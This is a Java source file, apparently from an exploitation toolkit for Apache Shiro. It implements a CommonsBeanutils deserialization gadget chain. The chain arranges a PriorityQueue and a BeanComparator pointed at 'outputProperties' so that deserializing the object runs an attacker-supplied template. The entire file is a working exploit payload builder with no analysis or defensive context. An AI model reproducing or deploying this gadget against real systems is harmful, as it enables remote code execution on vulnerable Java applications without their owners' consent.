package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.beanutils.BeanComparator;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;


@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"phith0n"})
public class CommonsBeanutilsString implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        ReflectionsUtils.setFieldValue(queue, "queue", new Object[] { template, template });

        ReflectionsUtils.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}



